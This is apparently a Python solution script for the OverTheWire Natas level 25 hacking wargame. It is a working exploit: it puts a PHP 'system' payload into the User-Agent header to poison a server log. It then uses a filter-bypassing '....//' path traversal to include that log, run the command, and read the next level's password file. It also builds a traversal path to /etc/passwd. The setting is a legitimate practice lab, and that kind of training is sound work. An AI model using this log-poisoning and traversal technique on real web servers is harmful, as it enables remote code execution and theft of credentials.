import requests
import re

username = "natas25"
password = "<censored>"
url = "http://%s.natas.labs.overthewire.org/"  % username

session = requests.Session()

response = session.get(url,auth=(username,password))
print(response.text)
print("="*50)

source = "index-source.html"
response = session.get(url+source,auth=(username,password))
print(response.text)
print("="*50)

print("Headers:\n" + str(response.headers))
print("="*50)

# Poisoning the user-agent with a payload
cmd = "<?php system('cat /etc/natas_webpass/natas26'); ?>"
headers = {"User-Agent":cmd}

# Getting the php session ID
response = session.get(url,auth=(username,password))
session_id = session.cookies["PHPSESSID"]

# Creating the log
response = session.post(url,auth=(username,password),data={"lang":"../../../"},headers=headers)
passwd_path = "....//....//....//....//....//etc/passwd"

# Reading the log to get the results of the natas25 password file
log_path = "....//....//....//....//....//var/www/natas/natas25/logs/natas25_"+session_id+".log"
log_response = session.post(url,auth=(username,password),data={"lang":log_path})
print("\nThe password for the next level is: " + re.findall(r"[a-zA-Z0-9]{32}",log_response.text)[1])